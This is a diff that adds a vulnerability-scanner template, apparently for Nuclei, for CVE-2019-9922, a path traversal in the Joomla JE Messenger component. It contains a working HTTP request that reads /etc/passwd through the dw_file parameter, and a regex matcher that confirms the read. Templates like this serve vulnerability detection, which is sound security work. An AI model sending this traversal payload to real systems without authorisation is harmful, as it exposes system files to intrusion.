@@ -1,0 +1,27 @@
+id: joomla-je-messenger-arbitrary-file-read
+
+info:
+  name: Joomla JE Messenger Arbitrary File Read (CVE-2019-9922)
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Joomla! Harmis JE Messenger component 1.2.2 has a path traversal vulnerability. An attacker could exploit this vulnerability to access locations outside the restricted directory.
+  tags: file-read
+  classification:
+    cve-id: CVE-2019-9922
+    cvss-score: 7.5
+
+http:
+  - raw:
+      - |
+        GET /index.php/component/jemessenger/box_details?task=download&dw_file=../../.././../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:(.*?):0:0"
